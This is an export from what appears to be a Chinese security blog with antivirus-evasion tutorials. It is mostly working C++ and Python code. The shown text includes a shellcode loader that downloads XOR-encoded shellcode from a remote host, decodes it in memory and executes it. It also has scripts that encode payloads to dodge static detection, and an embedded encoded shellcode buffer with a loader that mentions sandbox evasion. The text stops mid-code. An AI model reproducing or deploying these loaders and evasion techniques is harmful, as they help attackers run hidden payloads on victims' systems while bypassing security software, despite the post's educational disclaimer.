&lt;&lt; <span class="hljs-string">&quot;Error:Open session failed: &quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; endl;<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">//2. 通过上述句柄连接到服务器，需要指定服务器IP和端口号 INTERNET_DEFAULT_HTTP_PORT:80。若连接成功，返回的hConnect句柄不为NULL</span><br>hConnect = <span class="hljs-built_in">WinHttpConnect</span>(hSession, ip_wchar, port, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (hConnect == <span class="hljs-literal">NULL</span>) &#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Error:Connect failed: &quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; endl;<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">//3. 通过hConnect句柄创建一个hRequest句柄，用于发送数据与读取从服务器返回的数据。</span><br>hRequest = <span class="hljs-built_in">WinHttpOpenRequest</span>(hConnect, <span class="hljs-string">L&quot;GET&quot;</span>, url_wchar, <span class="hljs-literal">NULL</span>, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, <span class="hljs-number">0</span>);<br><span class="hljs-comment">//其中参数2表示请求方式，此处为Get；参数3:给定Get的具体地址，如这里的具体地址为https://www.citext.cn/GetTime.php</span><br><span class="hljs-keyword">if</span> (hRequest == <span class="hljs-literal">NULL</span>) &#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Error:OpenRequest failed: &quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; endl;<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br>BOOL bResults;<br><span class="hljs-comment">//发送请求</span><br>bResults = <span class="hljs-built_in">WinHttpSendRequest</span>(hRequest,<br>WINHTTP_NO_ADDITIONAL_HEADERS,<br><span class="hljs-number">0</span>, WINHTTP_NO_REQUEST_DATA, <span class="hljs-number">0</span>,<br><span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (!bResults) &#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Error:SendRequest failed: &quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; endl;<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">//（3） 发送请求成功则准备接受服务器的response。注意：在使用 WinHttpQueryDataAvailable和WinHttpReadData前必须使用WinHttpReceiveResponse才能access服务器返回的数据</span><br>bResults = <span class="hljs-built_in">WinHttpReceiveResponse</span>(hRequest, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br><br>LPVOID lpHeaderBuffer = <span class="hljs-literal">NULL</span>;<br>DWORD dwSize = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//4-3. 获取服务器返回数据</span><br>LPSTR pszOutBuffer = <span class="hljs-literal">NULL</span>;<br>DWORD dwDownloaded = <span class="hljs-number">0</span>;         <span class="hljs-comment">//实际收取的字符数</span><br><span class="hljs-type">wchar_t</span>* pwText = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">if</span> (bResults)<br>&#123;<br><span class="hljs-keyword">do</span><br>&#123;<br><span class="hljs-comment">//(1) 获取返回数据的大小（以字节为单位）</span><br>dwSize = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">WinHttpQueryDataAvailable</span>(hRequest, &amp;dwSize)) &#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Error：WinHttpQueryDataAvailable failed：&quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; endl;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (!dwSize)    <span class="hljs-keyword">break</span>;  <span class="hljs-comment">//数据大小为0                </span><br><br><span class="hljs-comment">//(2) 根据返回数据的长度为buffer申请内存空间</span><br>pszOutBuffer = <span class="hljs-keyword">new</span> <span class="hljs-type">char</span>[dwSize + <span class="hljs-number">1</span>];<br><span class="hljs-keyword">if</span> (!pszOutBuffer) &#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Out of memory.&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-built_in">ZeroMemory</span>(pszOutBuffer, dwSize + <span class="hljs-number">1</span>);       <span class="hljs-comment">//将buffer置0</span><br><br><span class="hljs-comment">//(3) 通过WinHttpReadData读取服务器的返回数据</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">WinHttpReadData</span>(hRequest, pszOutBuffer, dwSize, &amp;dwDownloaded)) &#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Error：WinHttpQueryDataAvailable failed：&quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">if</span> (!dwDownloaded)<br><span class="hljs-keyword">break</span>;<br><br><br>&#125; <span class="hljs-keyword">while</span> (dwSize &gt; <span class="hljs-number">0</span>);<br><span class="hljs-comment">//4-4. 将返回数据转换成UTF8</span><br>DWORD dwNum = <span class="hljs-built_in">MultiByteToWideChar</span>(CP_ACP, <span class="hljs-number">0</span>, pszOutBuffer, <span class="hljs-number">-1</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);    <span class="hljs-comment">//返回原始ASCII码的字符数目       </span><br>pwText = <span class="hljs-keyword">new</span> <span class="hljs-type">wchar_t</span>[dwNum];                                                <span class="hljs-comment">//根据ASCII码的字符数分配UTF8的空间</span><br><span class="hljs-built_in">MultiByteToWideChar</span>(CP_UTF8, <span class="hljs-number">0</span>, pszOutBuffer, <span class="hljs-number">-1</span>, pwText, dwNum);           <span class="hljs-comment">//将ASCII码转换成UTF8</span><br><span class="hljs-comment">//printf(&quot;\n返回数据为:\n%S\n\n&quot;, pwText);</span><br><br><br>&#125;<br><br><span class="hljs-comment">//5. 依次关闭request，connect，session句柄</span><br><span class="hljs-keyword">if</span> (hRequest) <span class="hljs-built_in">WinHttpCloseHandle</span>(hRequest);<br><span class="hljs-keyword">if</span> (hConnect) <span class="hljs-built_in">WinHttpCloseHandle</span>(hConnect);<br><span class="hljs-keyword">if</span> (hSession) <span class="hljs-built_in">WinHttpCloseHandle</span>(hSession);<br><br><span class="hljs-comment">/******************   将wchar转换为char  *******************/</span><br><span class="hljs-type">int</span> iSize;<br><span class="hljs-type">char</span>* data;<br><br><span class="hljs-comment">//返回接受字符串所需缓冲区的大小，已经包含字符结尾符&#x27;\0&#x27;</span><br>iSize = <span class="hljs-built_in">WideCharToMultiByte</span>(CP_ACP, <span class="hljs-number">0</span>, pwText, <span class="hljs-number">-1</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">//iSize =wcslen(pwsUnicode)+1=6</span><br>data = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(iSize * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">char</span>)); <span class="hljs-comment">//不需要 pszMultiByte = (char*)malloc(iSize*sizeof(char)+1);</span><br><span class="hljs-built_in">WideCharToMultiByte</span>(CP_ACP, <span class="hljs-number">0</span>, pwText, <span class="hljs-number">-1</span>, data, iSize, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span> data;<br>&#125;<br><br><br><br><br><span class="hljs-function"><span class="hljs-type">char</span>* <span class="hljs-title">StrToShellcode</span><span class="hljs-params">(<span class="hljs-type">char</span> str[], <span class="hljs-type">int</span>* length)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">char</span> buf[<span class="hljs-number">2048</span>];<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> s[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;,&quot;</span>;<br><span class="hljs-type">char</span>* token;<br><span class="hljs-type">char</span>* context;<br><span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br><span class="hljs-comment">/* 获取第一个子字符串 */</span><br>token = <span class="hljs-built_in">strtok_s</span>(str, s, &amp;context);<br><br><span class="hljs-comment">/* 继续获取其他的子字符串 */</span><br><span class="hljs-keyword">while</span> (token != <span class="hljs-literal">NULL</span>) &#123;<br>buf[i] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)<span class="hljs-built_in">atoi</span>(token);<br><span class="hljs-comment">//printf(&quot;%s  %d\n&quot;, token, i);</span><br><span class="hljs-comment">//printf(&quot;%02x\n&quot;, buf[i]);</span><br>token = <span class="hljs-built_in">strtok_s</span>(<span class="hljs-literal">NULL</span>, s, &amp;context);<br>i++;<br>&#125;<br><br>*length = i; <span class="hljs-comment">// 存储 shellcode 的长度</span><br><span class="hljs-keyword">return</span> buf;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">char</span>* data;<br>DWORD dwThreadId; <span class="hljs-comment">// 线程ID</span><br>HANDLE hThread; <span class="hljs-comment">// 线程句柄</span><br>DWORD dwOldProtect; <span class="hljs-comment">// 内存页属性</span><br><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> ip[<span class="hljs-number">16</span>] = <span class="hljs-string">&quot;10.211.55.2&quot;</span>;<br><span class="hljs-type">char</span>* ips = <span class="hljs-built_in">const_cast</span>&lt;<span class="hljs-type">char</span>*&gt;(ip);<br><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> url[<span class="hljs-number">11</span>] = <span class="hljs-string">&quot;calc.txt&quot;</span>;<br><span class="hljs-type">char</span>* urls = <span class="hljs-built_in">const_cast</span>&lt;<span class="hljs-type">char</span>*&gt;(url);<br><br>data = <span class="hljs-built_in">WinGet</span>(ips, <span class="hljs-number">80</span>, urls);<br><span class="hljs-comment">//cout &lt;&lt; &quot;返回的数据为: &quot; &lt;&lt; data &lt;&lt; endl;</span><br><br><span class="hljs-comment">//执行shellcode</span><br><span class="hljs-type">int</span> shellcode_length;<br> <span class="hljs-type">char</span>* buf = <span class="hljs-built_in">StrToShellcode</span>(data, &amp;shellcode_length);<br><br> <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; shellcode_length; i++) &#123;<br> buf[i] ^= <span class="hljs-number">10</span>;<br> &#125;<br><br> <span class="hljs-type">char</span>* shellcode = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">VirtualAlloc</span>(<br> <span class="hljs-literal">NULL</span>,<br> shellcode_length,<br> MEM_COMMIT,<br> PAGE_READWRITE <span class="hljs-comment">// 只申请可读可写</span><br> );<br><br><br> <span class="hljs-comment">// 将shellcode复制到可读可写的内存页中</span><br> <span class="hljs-built_in">CopyMemory</span>(shellcode, buf, shellcode_length);<br><br> <span class="hljs-built_in">VirtualProtect</span>(shellcode, shellcode_length, PAGE_EXECUTE, &amp;dwOldProtect);<br><br><br> hThread = <span class="hljs-built_in">CreateThread</span>(<br> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 安全描述符</span><br> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 栈的大小</span><br> (LPTHREAD_START_ROUTINE)shellcode, <span class="hljs-comment">// 函数</span><br> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 参数</span><br> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 线程标志</span><br> &amp;dwThreadId <span class="hljs-comment">// 线程ID</span><br> );<br><br> <span class="hljs-built_in">WaitForSingleObject</span>(hThread, INFINITE); <span class="hljs-comment">// 一直等待线程执行结束</span><br> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="binary-to-decimal脚本"><a href="#binary-to-decimal脚本" class="headerlink" title="binary_to_decimal脚本"></a>binary_to_decimal脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">binary_to_decimal</span>(<span class="hljs-params">input_file, output_file</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        binary_data = file.read()<br><br>    decimal_numbers = [<span class="hljs-built_in">str</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> binary_data]<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        file.write(<span class="hljs-string">&#x27;,&#x27;</span>.join(decimal_numbers))<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Conversion completed. Decimal numbers saved in <span class="hljs-subst">&#123;output_file&#125;</span>.&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python binary_to_decimal.py input_file output_file&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        input_file = sys.argv[<span class="hljs-number">1</span>]<br>        output_file = sys.argv[<span class="hljs-number">2</span>]<br>        binary_to_decimal(input_file, output_file)<br></code></pre></td></tr></table></figure><p><img src="image-20240703015830616.png" alt="image-20240703015830616"></p><h4 id="bin2shellcode"><a href="#bin2shellcode" class="headerlink" title="bin2shellcode"></a>bin2shellcode</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> argparse <span class="hljs-keyword">import</span> ArgumentParser, FileType<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">apply_xor</span>(<span class="hljs-params">bytearray_data, xor_key, output_file=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(bytearray_data)):<br>        bytearray_data[i] ^= xor_key<br>    <span class="hljs-keyword">if</span>  output_file:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(bytearray_data)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    parser = ArgumentParser()<br>    parser.add_argument(<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-built_in">type</span>=FileType(<span class="hljs-string">&quot;rb&quot;</span>), <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;输入文件路径&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;mode&quot;</span>, choices=[<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;cs&quot;</span>], <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;输出模式：c 或 cs&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-x&quot;</span>, <span class="hljs-string">&quot;--xor&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;XOR 密钥&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-o&quot;</span>, <span class="hljs-string">&quot;--output&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;输出xor的bin文件&quot;</span>)<br>    args = parser.parse_args()<br><br>    <span class="hljs-keyword">if</span> args.xor:<br>        xor_key = args.xor<br>    <span class="hljs-keyword">else</span>:<br>        xor_key = <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">if</span> args.mode == <span class="hljs-string">&quot;c&quot;</span>:<br>        <span class="hljs-comment"># 适用于 C shellcode</span><br>        shellcode = <span class="hljs-string">&quot;\&quot;&quot;</span><br>        ctr = <span class="hljs-number">1</span><br>        maxlen = <span class="hljs-number">15</span><br><br>        bytearray_data = <span class="hljs-built_in">bytearray</span>(args.file.read())<br><br>        <span class="hljs-keyword">if</span> xor_key:<br>            apply_xor(bytearray_data, xor_key, args.output)<br><br>        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> bytearray_data:<br>            shellcode += <span class="hljs-string">&quot;\\x&quot;</span> + <span class="hljs-built_in">format</span>(b, <span class="hljs-string">&#x27;02x&#x27;</span>)<br>            <span class="hljs-keyword">if</span> ctr == maxlen:<br>                shellcode += <span class="hljs-string">&quot;\&quot; \n\&quot;&quot;</span><br>                ctr = <span class="hljs-number">0</span><br>            ctr += <span class="hljs-number">1</span><br>        shellcode += <span class="hljs-string">&quot;\&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;unsigned char buf[] =\n&quot;</span> + shellcode + <span class="hljs-string">&quot;;&quot;</span>)<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># 适用于 C# shellcode</span><br>        shellcode_raw = <span class="hljs-string">&quot;&quot;</span><br>        shellcode_hex = <span class="hljs-string">&quot;&quot;</span><br>        ctr = <span class="hljs-number">1</span><br>        maxlen = <span class="hljs-number">15</span><br><br>        bytearray_data = <span class="hljs-built_in">bytearray</span>(args.file.read())<br><br>        <span class="hljs-keyword">if</span> xor_key:<br>            apply_xor(bytearray_data, xor_key, args.output)<br><br>        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> bytearray_data:<br>            shellcode_hex += <span class="hljs-string">&quot;0x&quot;</span> + <span class="hljs-built_in">format</span>(b, <span class="hljs-string">&#x27;02x&#x27;</span>) + <span class="hljs-string">&quot;,&quot;</span><br>            <span class="hljs-keyword">if</span> ctr == maxlen:<br>                shellcode_hex += <span class="hljs-string">&quot;\n&quot;</span><br>                ctr = <span class="hljs-number">0</span><br>            ctr += <span class="hljs-number">1</span><br>        length = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(bytearray_data))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;byte[] buf = new byte[&quot;</span> + length + <span class="hljs-string">&quot;] &#123;\n&quot;</span> + shellcode_hex[:-<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;&#125;;&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="image-20240703015933976.png" alt="image-20240703015933976"></p><p><strong>-o 文件名</strong>，xor后生成新的bin</p><p><img src="image-20240703020010451.png" alt="image-20240703020010451"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://rvn0xsy.github.io/">https://rvn0xsy.github.io</a></p><p><a href="https://luckyfuture.top/BypassAVLearning2.html#%E4%BB%8Eweb%E5%8A%A0%E8%BD%BDshellcode">https://luckyfuture.top/BypassAVLearning2.html#%E4%BB%8Eweb%E5%8A%A0%E8%BD%BDshellcode</a></p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>免杀</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>静态恶意代码逃逸(二)</title>
    <link href="/2024/06/04/%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8-%E4%BA%8C/"/>
    <url>/2024/06/04/%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8-%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-关于内存申请的优化"><a href="#0x01-关于内存申请的优化" class="headerlink" title="0x01 关于内存申请的优化"></a>0x01 关于内存申请的优化</h2><p>​在申请内存页时，一定要把控好属性，可以在Shellcode读入时，申请一个普通的可读写的内存页，然后再通过VirtualProtect改变它的属性 -&gt; 可执行。</p><p>VirtualProtect 是一个Windows函数，用于修改内存页的保护属性。它允许程序员在运行时更改内存页的访问权限，例如将可执行的内存页标记为只读，或将只读内存页标记为可写。</p><p>函数原型如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">VirtualProtect</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  LPVOID lpAddress,</span></span><br><span class="hljs-params"><span class="hljs-function">  SIZE_T dwSize,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD  flNewProtect,</span></span><br><span class="hljs-params"><span class="hljs-function">  PDWORD lpflOldProtect</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>参数说明：</p><ul><li><p><code>lpAddress</code>：指向要修改保护属性的内存页的起始地址。</p></li><li><p><code>dwSize</code>：要修改的内存页的大小，以字节为单位。</p></li><li><pre><code class="hljs">flNewProtect<figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs r"><br>  ：新的保护属性，可以是以下值之一：<br><br>  <span class="hljs-operator">-</span> `PAGE_EXECUTE`：可执行和可读。<br>  <span class="hljs-operator">-</span> `PAGE_EXECUTE_READ`：可执行、可读和不能写。<br>  <span class="hljs-operator">-</span> `PAGE_EXECUTE_READWRITE`：可执行、可读和可写。<br>  <span class="hljs-operator">-</span> `PAGE_EXECUTE_WRITECOPY`：可执行、可读和写入时复制。<br>  <span class="hljs-operator">-</span> `PAGE_NOACCESS`：无法访问。<br>  <span class="hljs-operator">-</span> `PAGE_READONLY`：只读。<br>  <span class="hljs-operator">-</span> `PAGE_READWRITE`：可读和可写。<br>  <span class="hljs-operator">-</span> `PAGE_WRITECOPY`：写入时复制。<br><br><span class="hljs-operator">-</span> `lpflOldProtect`：用于存储修改前的保护属性的变量的指针。<br><br>函数返回值为 `BOOL` 类型，如果函数调用成功，则返回非零值；如果函数调用失败，则返回零。可以使用 `GetLastError` 函数获取更多有关错误信息的详细信息。<br><br>```c++<br>#include &lt;Windows.h&gt;<br><br>unsigned char buf[] =<br>&quot;\xf6\xe2\x88\x0a\x0a\x0a\x6a\x83\xef\x3b\xca\x6e\x81\x5a\x3a&quot;<br>&quot;\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5&quot;<br>&quot;\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xf8\x58&quot;<br>&quot;\x5d\x81\x58\x1a\x81\x40\x36\x81\x46\x1b\x72\xe9\x42\x0b\xdb&quot;<br>&quot;\x5b\x81\x53\x2a\x0b\xd9\x81\x43\x12\xe9\x30\x43\x81\x3e\x81&quot;<br>&quot;\x0b\xdc\x3b\xf5\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfc\x09&quot;<br>&quot;\x77\xf2\x31\x77\x2e\x7f\xee\x52\x81\x52\x2e\x0b\xd9\x6c\x81&quot;<br>&quot;\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e&quot;<br>&quot;\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x55\x55\x50\x81\x18\xe1&quot;<br>&quot;\x87\x57\x60\x0b\x87\x8f\xb8\x0a\x0a\x0a\x5a\x62\x3b\x81\x65&quot;<br>&quot;\x8d\xf5\xdf\xb1\xfa\xbf\xa8\x5c\x62\xac\x9f\xb7\x97\xf5\xdf&quot;<br>&quot;\x36\x0c\x76\x00\x8a\xf1\xea\x7f\x0f\xb1\x4d\x19\x78\x65\x60&quot;<br>&quot;\x0a\x59\xf5\xdf\x69\x6b\x66\x69\x24\x6f\x72\x6f\x0a&quot;;<br><br>// 入口函数<br>int main(int argc, char* argv[]) &#123;<br><br>    int shellcode_size = 0; // shellcode长度<br>    DWORD dwThreadId; // 线程ID<br>    HANDLE hThread; // 线程句柄<br>    DWORD dwOldProtect; // 内存页属性<br>/* length: 800 bytes */<br><br>    // 获取shellcode大小<br>    shellcode_size = sizeof(buf);<br><br>    /* 增加异或代码 */<br>    for (int i = 0; i &lt; shellcode_size; i++) &#123;<br>        buf[i] ^= 10;<br>    &#125;<br>    /*<br>    VirtualAlloc(<br>        NULL, // 基址<br>        800,  // 大小<br>        MEM_COMMIT, // 内存页状态<br>        PAGE_EXECUTE_READWRITE // 可读可写可执行<br>        );<br>    */<br><br>    char* shellcode = (char*)VirtualAlloc(<br>        NULL,<br>        shellcode_size,<br>        MEM_COMMIT,<br>        PAGE_READWRITE // 只申请可读可写<br>    );<br><br>    // 将shellcode复制到可读可写的内存页中<br>    CopyMemory(shellcode, buf, shellcode_size);<br><br>    // 这里开始更改它的属性为可执行<br>    VirtualProtect(shellcode, shellcode_size, PAGE_EXECUTE, &amp;dwOldProtect);<br><br>    // 等待几秒，兴许可以跳过某些沙盒呢？<br><br>    hThread = CreateThread(<br>        NULL, // 安全描述符<br>        NULL, // 栈的大小<br>        (LPTHREAD_START_ROUTINE)shellcode, // 函数<br>        NULL, // 参数<br>        NULL, // 线程标志<br>        &amp;dwThreadId // 线程ID<br>    );<br><br>    WaitForSingleObject(hThread, INFINITE); // 一直等待线程执行结束<br>    return 